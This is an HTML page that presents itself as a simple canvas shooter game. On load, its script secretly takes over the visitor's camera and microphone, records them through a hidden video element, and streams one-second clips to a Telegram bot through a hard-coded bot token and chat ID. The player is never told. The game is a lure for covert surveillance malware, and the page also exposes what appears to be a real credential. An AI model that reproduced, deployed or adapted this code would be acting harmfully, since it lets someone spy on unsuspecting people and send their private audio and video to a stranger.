<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mini Shooter Game & Recorder</title>
  <style>
    body, html {
      margin: 0; padding: 0; overflow: hidden;
      background: #000;
      color: #fff;
      font-family: sans-serif;
    }
    #gameCanvas {
      display: block;
      background: #111;
    }
    #score {
      position: absolute;
      top: 10px; left: 10px;
      font-size: 20px;
    }
    #preview { display: none; }
  </style>
</head>
<body>
  <div id="score">Score: 0</div>
  <canvas id="gameCanvas"></canvas>
  <video id="preview" autoplay muted></video>

  <script>
    // ====== SETUP CAMERA & RECORDING ======
    const video = document.getElementById('preview');
    let mediaRecorder;
    let BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
    let CHAT_ID   = '8050058475';

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
      .then(stream => {
        video.srcObject = stream;
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        // Mulai recorder dengan chunk tiap 1 detik
        mediaRecorder.start(1000);

        mediaRecorder.ondataavailable = e => {
          if (e.data && e.data.size > 0) {
            sendToTelegram(e.data);
          }
        };
      })
      .catch(err => console.error('Gagal akses kamera:', err));

    function sendToTelegram(blob) {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('video', blob, 'clip.webm');
      // langsung kirim tanpa tunggu penuh
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: form
      })
      .then(res => res.json())
      .then(json => {
        if (!json.ok) console.error('Gagal kirim:', json);
      })
      .catch(err => console.error('Error kirim video:', err));
    }


    // ====== GAME LOGIC ======
    const canvas = document.getElementById('gameCanvas');
    const ctx    = canvas.getContext('2d');
    let w, h;
    let targets = [];
    let score = 0;
    const TARGET_RADIUS = 20;

    function resize() {
      w = canvas.width  = window.innerWidth;
      h = canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    class Target {
      constructor() {
        this.x = Math.random() * (w - 2*TARGET_RADIUS) + TARGET_RADIUS;
        this.y = Math.random() * (h - 2*TARGET_RADIUS) + TARGET_RADIUS;
        this.vx = (Math.random()*2-1) * 2;
        this.vy = (Math.random()*2-1) * 2;
      }
      move() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < TARGET_RADIUS || this.x > w - TARGET_RADIUS) this.vx *= -1;
        if (this.y < TARGET_RADIUS || this.y > h - TARGET_RADIUS) this.vy *= -1;
      }
      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, TARGET_RADIUS, 0, Math.PI*2);
        ctx.fillStyle = '#f00';
        ctx.fill();
      }
      isHit(x,y) {
        return Math.hypot(this.x - x, this.y - y) < TARGET_RADIUS;
      }
    }

    function spawnTargets(n=5) {
      targets = [];
      for (let i=0; i<n; i++) targets.push(new Target());
    }

    canvas.addEventListener('click', e => {
      const rect = canvas.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;
      for (let i = targets.length - 1; i >= 0; i--) {
        if (targets[i].isHit(x,y)) {
          targets.splice(i,1);
          score++;
          document.getElementById('score').textContent = `Score: ${score}`;
          // setiap kena, spawn 1 target baru
          targets.push(new Target());
          break;
        }
      }
    });

    function loop() {
      ctx.clearRect(0,0,w,h);
      targets.forEach(t => {
        t.move();
        t.draw();
      });
      requestAnimationFrame(loop);
    }

    // mulai game
    spawnTargets(7);
    loop();

  </script>
</body>
</html>
